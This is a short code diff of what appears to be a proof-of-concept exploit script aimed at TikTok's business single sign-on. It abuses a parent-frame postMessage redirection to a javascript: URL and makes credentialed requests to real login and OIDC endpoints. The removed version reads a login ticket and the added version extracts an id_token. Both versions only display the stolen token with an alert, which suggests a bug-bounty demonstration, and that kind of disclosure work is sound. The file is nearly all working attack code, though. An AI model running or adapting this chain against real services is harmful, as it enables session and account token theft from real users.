@@ -1,6 +1,21 @@
 <script>
-parent.postMessage({
-    action: "requestRedirectionTo",
-    targetUrlStr: "javascript:var x=new XMLHttpRequest();x.open('GET','https://business-sso.tiktok.com/check_login/',!0);x.withCredentials=!0;x.onload=()=>{var t=JSON.parse(x.responseText).ticket;alert('magic token is = ' + t)};x.send()"
-}, "*");
+(function(){
+    var x = new XMLHttpRequest();
+    x.open('GET', 'https://business-sso.tiktok.com/oidc/web_auth/?aid=1583&client_id=fae9da30-e377-406a-941d-3ceea97626f4&nonce=randomNonceHere&redirect_uri=https://business-suite.tiktokw.eu/message/auth&response_type=id_token&scope=user_id&state=randomStateHere', true);
+    x.withCredentials = true;
+    x.onreadystatechange = function() {
+        if (x.readyState === 4) {
+            // Check if it's a redirect (302 Found)
+            var locationHeader = x.getResponseHeader('Location');
+            if (locationHeader && locationHeader.includes('#id_token=')) {
+                var token = locationHeader.match(/id_token=([^&]+)/)[1];
+                parent.postMessage({
+                    action: "requestRedirectionTo",
+                    targetUrlStr: "javascript:alert('Magic token is = " + decodeURIComponent(token) + "')"
+                }, "*");
+            }
+        }
+    };
+    x.send();
+})();
 </script>
